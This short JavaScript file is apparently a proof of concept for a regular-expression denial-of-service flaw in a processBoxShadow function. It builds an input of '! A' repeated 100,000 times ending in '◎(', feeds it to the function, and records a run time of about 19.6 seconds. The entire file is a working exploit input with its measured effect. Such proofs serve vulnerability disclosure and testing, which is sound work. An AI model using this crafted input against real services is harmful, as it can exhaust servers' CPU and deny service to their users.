"use strict";

var _processBoxShadow = _interopRequireDefault(require("./processBoxShadow.js"));
function _interopRequireDefault(e) { return e && e.__esModule ? e : { "default": e }; }
//Attack String :""+"! A"*100000+"◎("
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "! A";
}
str += "◎(";
console.log((0, _processBoxShadow["default"])(str));

// real    0m19.615s
// user    0m19.549s
// sys     0m0.030s